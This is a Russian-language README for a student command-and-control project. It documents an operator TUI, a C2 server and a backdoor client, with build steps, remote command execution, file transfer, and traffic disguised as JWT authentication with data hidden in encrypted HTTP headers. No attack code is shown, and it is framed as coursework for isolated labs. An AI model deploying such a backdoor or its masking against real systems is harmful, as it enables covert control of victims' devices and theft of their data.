# C2 Project - Удаленный доступ к устройству

## Описание

Комплект ПО для удаленного доступа к устройству, состоящий из трех компонентов:

- **Терминал оператора (TUI)** — интерфейс для отправки команд
- **C2-сервер** — промежуточный компонент для агрегации задач
- **Клиент** — бэкдор, выполняющий команды

## Требования

- Go 1.26 или новее (для локальной сборки)
- Операционная система: Windows, Linux или macOS
- Для выполнения Linux-команд на Windows: WSL (Windows Subsystem for Linux)
- Docker (опционально, для запуска через контейнеры)
- Windows Terminal (рекомендуется для корректного отображения TUI)
- OpenSSL (для генерации сертификата) или Go (для встроенного генератора)

## Установка Go

Скачайте и установите Go с официального сайта: https://go.dev/dl/

## Структура проекта

```
c2-project/
├── bin/                    # Собранные исполняемые файлы
├── certs/                  # Самоподписанные сертификаты (не коммитятся)
│   ├── server.crt
│   └── server.key
├── cmd/                    # Исходный код компонентов
│   ├── c2-server/          # C2-сервер
│   ├── client/             # Клиент (бэкдор)
│   └── terminal/           # Терминал оператора (TUI)
├── configs/                # Конфигурационные файлы
│   ├── server.json         # Настройки сервера (Docker)
│   ├── client.json         # Настройки клиента (Docker)
│   ├── terminal.json       # Настройки терминала (Docker)
│   ├── server.local.json   # Настройки сервера (локально)
│   ├── client.local.json   # Настройки клиента (локально)
│   └── terminal.local.json # Настройки терминала (локально)
├── internal/               # Внутренние пакеты
│   ├── api/                # HTTP-хендлеры, middleware, роутеры, валидация
│   ├── chunk/              # Фрагментация данных на чанки
│   ├── compress/           # Сжатие gzip
│   ├── crypto/             # Шифрование AES-256-GCM
│   ├── executor/           # Выполнение команд с тайм-аутом
│   ├── filetransfer/       # Передача файлов с SHA-256
│   ├── jwt/                # JWT-токены (маскировка)
│   ├── logger/             # zap-логирование
│   ├── models/             # Структуры данных
│   ├── protocol/           # Протокол передачи
│   ├── service/            # Бизнес-логика
│   │   ├── client/         # Сервис клиента
│   │   ├── server/         # Сервис сервера
│   │   ├── terminal/       # Сервис терминала
│   │   ├── task_service.go
│   │   ├── client_service.go
│   │   └── errors.go
│   └── storage/            # Хранилище задач и клиентов
├── Dockerfile
├── docker-compose.yml
├── Makefile
├── .dockerignore
├── .gitignore
├── go.mod
├── go.sum
└── README.md
```

## Генерация HTTPS-сертификата

Перед первым запуском **сгенерируйте самоподписанный сертификат** для HTTPS:

### Вариант 1 — через OpenSSL

```bash
mkdir certs
openssl req -x509 -newkey rsa:4096 \
  -keyout certs/server.key \
  -out certs/server.crt \
  -days 365 -nodes \
  -subj "/C=RU/ST=Moscow/L=Moscow/O=C2Project/CN=localhost"
```

### Вариант 2 — через Go-скрипт

Если OpenSSL нет — напишите `gen_cert.go` (см. историю коммитов) и запустите:

```bash
go run gen_cert.go
```

Сертификаты **не коммитятся** в Git — добавьте `certs/` в `.gitignore`.

## Конфигурация

Все конфиги работают по **HTTPS** на порту **8443**.

### Конфигурация для Docker

**configs/server.json:**
```json
{
    "listen_address": ":8443"
}
```

**configs/client.json:**
```json
{
    "server_url": "https://server:8443",
    "client_id": "client-001",
    "poll_interval": 5
}
```

**configs/terminal.json:**
```json
{
    "server_url": "https://server:8443"
}
```

### Конфигурация для локального запуска

**configs/server.local.json:**
```json
{
    "listen_address": ":8443"
}
```

**configs/client.local.json:**
```json
{
    "server_url": "https://localhost:8443",
    "client_id": "client-001",
    "poll_interval": 5
}
```

**configs/terminal.local.json:**
```json
{
    "server_url": "https://localhost:8443"
}
```

## Сборка проекта

### 1. Откройте терминал в папке проекта

```bash
cd c2-project
```

### 2. Установите зависимости

```bash
go mod tidy
```

### 3. Соберите все компоненты

```bash
go build -o bin/c2-server.exe ./cmd/c2-server
go build -o bin/client.exe ./cmd/client
go build -o bin/terminal.exe ./cmd/terminal
```

### 4. Сборка для Linux (если нужно)

```bash
GOOS=linux GOARCH=amd64 go build -o bin/c2-server ./cmd/c2-server
GOOS=linux GOARCH=amd64 go build -o bin/client ./cmd/client
GOOS=linux GOARCH=amd64 go build -o bin/terminal ./cmd/terminal
```

## Запуск через Docker (рекомендуемый способ)

### 1. Установите Docker Desktop

https://www.docker.com/products/docker-desktop/

### 2. Сгенерируйте сертификат (см. выше)

### 3. Соберите образы

```bash
docker-compose build
```

### 4. Запустите все компоненты

```bash
docker-compose up
```

### 5. Подключитесь к терминалу

```bash
docker attach c2-terminal
```

### 6. Остановка

```bash
docker-compose down
```

### Проверка работы

В логах сервера должны появиться записи:

```json
{"level":"info","msg":"C2 Server starting (HTTPS)","address":":8443"}
{"level":"info","msg":"Client registered","client_id":"client-001"}
{"level":"info","msg":"HTTP request","method":"POST","path":"/api/register","status":200,"duration":"75µs","remote":"172.18.0.5:45958"}
{"level":"info","msg":"HTTP request","method":"POST","path":"/api/poll","status":200,"duration":"20µs","remote":"172.18.0.5:45958"}
```

## Запуск (локально, без Docker)

**Важно!** Запускайте все компоненты в **отдельных окнах терминала**.
Для корректного отображения TUI в Windows используйте **Windows Terminal**.

Перед запуском перейдите в папку проекта:

```bash
cd c2-project
```

### 1. Запуск C2-сервера

```bash
bin\c2-server.exe -local
```

Ожидаемый вывод:

```json
{"level":"info","msg":"C2 Server starting (HTTPS)","address":":8443"}
```

### 2. Запуск клиента (на атакуемом устройстве)

```bash
bin\client.exe -local -id client-001
```

Ожидаемый вывод:

```json
{"level":"info","msg":"Client starting","client_id":"client-001"}
{"level":"info","msg":"Registration successful"}
```

Для запуска **нескольких клиентов** используйте аргумент `-id`:

```bash
bin\client.exe -local -id client-001
bin\client.exe -local -id client-002
```

### 3. Запуск терминала оператора (TUI)

```bash
bin\terminal.exe -local
```

Ожидаемый вывод:

```
C2 Terminal Operator v2.0
Client: client-001
> Enter command...
```

## Использование

1. Запустите C2-сервер
2. Запустите одного или нескольких клиентов
3. Запустите терминал
4. В терминале введите команду и нажмите Enter

### Команды TUI

| Команда | Описание |
|---|---|
| `ls -la` | Выполнить команду на клиенте |
| `whoami` | Имя пользователя |
| `/clients` | Показать список клиентов |
| `/select <id>` | Переключиться на клиента |
| `/clear` | Очистить историю |
| `/help` | Показать справку |
| `upload <local> <remote>` | Отправить файл клиенту |
| `download <remote> <local>` | Скачать файл с клиента |
| `q` или `Ctrl+C` | Выйти из TUI |

### Примеры команд

**Linux (через Docker):**

- `ls -la` — список файлов
- `ps aux | head -10` — первые 10 процессов
- `echo "DEADBEEF" | base64` — кодирование в Base64
- `whoami` — имя пользователя
- `hostname` — имя компьютера

**Windows (локально):**

- `whoami && hostname && ver` — информация о системе
- `dir C:\ && echo OK || echo FAIL` — список файлов на диске C
- `ipconfig && systeminfo | findstr /i "OS Name"` — IP и версия ОС
- `tasklist | findstr /i "go"` — процессы с "go" в имени

## Передача файлов

Поддерживается **upload** и **download** файлов с **проверкой целостности** (SHA-256).

### Upload — отправить файл клиенту

В TUI:

```
upload <local_path> <remote_path>
```

Пример:

```
upload test.txt uploads/hello.txt
```

Результат:

```
File sent to client client-001
  task_id: 20260930132307-2-6efa0791
  local:  /app/test.txt
  remote: uploads/hello.txt
```

Файл **сохраняется на клиенте** по пути `uploads/hello.txt` с **проверкой SHA-256**.

### Download — скачать файл с клиента

В TUI:

```
download <remote_path> <local_path>
```

Пример:

```
download uploads/hello.txt downloaded.txt
```

Результат:

```
File saved: downloaded.txt
  source: uploads/hello.txt
  checksum: verified (SHA-256)
```

**Checksum** проверяется на **обеих сторонах** — при приёме и при сохранении.

## Тесты

Проект покрыт **юнит-тестами** (~85% по тестируемым пакетам):

```bash
# Все тесты
go test ./...

# С покрытием
go test ./... -cover

# С подробным выводом
go test ./... -v

# Конкретный пакет
go test ./internal/api/ -v
```

### Покрытие по пакетам

| Пакет | Покрытие |
|-------|----------|
| `internal/api` | **94.9%** |
| `internal/chunk` | **98.9%** |
| `internal/compress` | 88.9% |
| `internal/crypto` | 82.1% |
| `internal/executor` | 68.6% |
| `internal/filetransfer` | **90.5%** |
| `internal/jwt` | **94.1%** |
| `internal/protocol` | 77.8% |
| `internal/storage` | **100%** |

### Что нашли тесты

При написании тестов найдены и **исправлены реальные баги**:

1. **`generateID`** — коллизии ID на Windows из-за низкого разрешения таймера (~15 мс). Заменено на `timestamp + counter + random`.
2. **`TasksHandler`** — двойное отрезание `Bearer`, из-за чего задачи не создавались.
3. **`sendChunk`** — не проверял HTTP-статус, молча терял чанки при 500.
4. **`executor`** — `exec.CommandContext` не убивал дерево процессов на Windows. Исправлено через `taskkill /F /T /PID`. До фикса команда висела 9 секунд, после — прерывается за 500 мс.
5. **`handleFileUpload`** — двойной префикс `uploads/`, файл сохранялся не туда.

## Пример работы

### Терминал оператора (TUI)

```
C2 Terminal Operator v2.0  Client: client-001  Command executed

История команд:
  > ls -la [client-001]
  > whoami [client-001]

Результат:
┌────────────────────────────────────────────────────┐
│ total 44                                           │
│ drwxr-xr-x 1 root root 4096 Aug 27 12:10 .         │
│ drwxr-xr-x 1 root root 4096 Aug 27 12:12 ..        │
└────────────────────────────────────────────────────┘

> Enter command...
```

### Логи сервера

```json
{"level":"info","msg":"C2 Server starting (HTTPS)","address":":8443"}
{"level":"info","msg":"Client registered","client_id":"client-001"}
{"level":"info","msg":"HTTP request","method":"POST","path":"/api/register","status":200,"duration":"75µs"}
{"level":"info","msg":"HTTP request","method":"POST","path":"/api/poll","status":200,"duration":"20µs"}
{"level":"info","msg":"Task created","task_id":"20260930131235-1-a690194a"}
{"level":"info","msg":"HTTP request","method":"POST","path":"/api/tasks","status":200,"duration":"248µs"}
{"level":"info","msg":"HTTP request","method":"POST","path":"/api/results","status":200,"duration":"21µs"}
```

### Логи клиента

```json
{"level":"info","msg":"Client starting","client_id":"client-001"}
{"level":"info","msg":"Registration successful"}
{"level":"info","msg":"Task decrypted","command":"whoami"}
{"level":"info","msg":"File saved: uploads/hello.txt (33 bytes, checksum verified)"}
```

## Makefile

Для удобства сборки, тестирования и запуска есть `Makefile`:

```bash
make build          # Собрать все три компонента (server, client, terminal)
make build-server   # Только c2-server
make build-client   # Только client
make build-terminal # Только terminal
make test           # Запустить все тесты
make fmt            # Форматирование кода (go fmt)
make clean          # Очистить bin/
make docker         # Docker: down + build --no-cache + up
make docker-down    # Остановить Docker-контейнеры
```

## Протокол передачи данных

- **Протокол:** HTTPS (TLS 1.2+ + HTTP)
- **Шифрование:** AES-256-GCM (симметричное)
- **Маскировка:** JWT с **зашифрованным** `client_id` в поле `data`
- **Целостность файлов:** SHA-256
- **Фрагментация:** чанки START/DATA/END (для данных > 1KB)
- **Сжатие:** gzip (для результатов длиннее 5000 байт)
- **Параллелизм:** отправка чанков через `errgroup` (~25× ускорение)

## Безопасность

- **HTTPS** с самоподписанным сертификатом (TLS)
- Все данные шифруются **AES-256-GCM**
- `client_id` в JWT **зашифрован**, не виден в открытом виде
- Передача маскируется под **JWT-аутентификацию**
- Данные передаются в **заголовках** HTTP, не в теле
- Крупные данные **фрагментируются** на чанки
- **Checksum SHA-256** при передаче файлов
- **Тайм-ауты** на выполнение команд (30 секунд)

## Устранение неполадок

### Ошибка: "go: command not found"

Решение: Установите Go: https://go.dev/dl/

### Ошибка: "port 8443 already in use"

Решение: Закройте все окна с запущенным сервером и попробуйте снова.

### Ошибка: "Connection refused"

Решение: Убедитесь, что сервер запущен и конфигурации указывают на правильный адрес.

### Ошибка: "certificate not found: certs/server.crt"

Решение: Сгенерируйте сертификат (см. раздел **Генерация HTTPS-сертификата**).

### Ошибка: "x509: certificate signed by unknown authority"

Решение: В `client.go` и `terminal.go` установлен `InsecureSkipVerify: true` — для самоподписанного сертификата это норма.

### TUI отображается некорректно (наслаивается)

Решение: Используйте Windows Terminal вместо обычного CMD. Он лучше поддерживает альтернативный экранный режим.

### Некорректные символы при выполнении Windows-команд

Команды выполняются корректно, статус всегда `completed`. Некорректные символы могут появляться из-за OEM-кодировки (CP866), которую Windows использует для консольного вывода. Это особенность отображения, а не ошибка программы. Конвертация CP866 → UTF-8 выполняется автоматически.

### Docker: "port already in use"

Решение: Остановите локальный сервер или измените порт в `configs/server.json`.

## Важно

Данный проект имеет **сугубо учебный характер**. Не используйте в реальных сетях!
Разрабатывайте и тестируйте только в **изолированном, виртуализированном пространстве**.

## Автор

Хисматуллин Ильяс Рустемович
Группа: БББО-13-24